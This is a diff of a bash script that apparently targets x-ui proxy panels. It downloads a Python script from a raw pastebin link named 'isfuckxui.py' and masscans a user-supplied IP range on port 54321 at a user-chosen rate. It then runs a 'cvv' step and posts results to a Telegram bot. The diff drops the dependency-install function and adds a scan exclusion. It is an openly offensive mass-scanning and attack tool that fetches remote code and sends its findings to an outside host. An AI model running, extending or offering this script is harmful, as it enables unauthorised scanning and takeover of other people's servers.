@@ -1,12 +1,5 @@
 #! /bin/bash
-upd(){
-    apt-get update
-    apt-get upgrade
-    apt install masscan
-    apt install libpcap-dev
-    apt install python
-    pip3 install requests
-}
+
 
 pyzt(){
     curl -o isfuckxui.py https://pastebin.com/raw/qnNvDG6f
@@ -25,13 +18,13 @@ tgbots(){
     URL="https://api.telegram.org/bot${TOKEN}/sendMessage"	
     curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
 }
-upd
+
 pyzt
 echo "Enter your IP CIOR!"
 read sbip
 echo "ENTER YOUR MAX FUCKXUI RATE!"
 read fucku
-masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt
+masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt --exclude 255.255.255.25
 cvv
 tgbots
 
